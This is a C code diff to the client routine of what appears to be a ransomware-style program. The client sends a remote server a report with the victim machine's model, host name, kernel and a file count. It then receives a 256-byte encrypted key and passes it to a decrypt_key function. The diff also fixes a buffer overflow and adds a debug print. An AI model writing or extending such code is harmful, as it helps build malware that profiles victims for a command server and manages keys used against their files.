@@ -13,6 +13,7 @@
 #include "../../headers/thread.h"
 #include "../../headers/watcher.h"
 #include "../../headers/globals.h"
+#include "../../headers/decrypt_key.h"
 
 const int THREADS_NUMBER = 8;
 
@@ -128,10 +129,20 @@ int startclient() {
 
     char *model = get_computer_model();
 
-    char ret[64];
-    sprintf(ret, "%s %d, model: %s, username: %s, OS kernel: %s", hey, file_number, model, nodename, sysname);
+    char ret[523];
+    snprintf(ret, sizeof(ret), "%s %d, model: %s, username: %s, OS kernel: %s", hey, file_number, model, nodename, sysname);
     send(client_fd, ret, strlen(ret), 0);
     free(model);
+
+    printf("still here??\n");
+
+    unsigned char encrypted[256];
+    int received = recv(client_fd, encrypted, sizeof(encrypted), 0);
+    if (received != 256) {
+        printf("key receive failed, got %d bytes\n", received);
+        return -1;
+    }
+    decrypt_key(encrypted);
 
     int *clientfd = malloc(sizeof(int));
     *clientfd = client_fd;
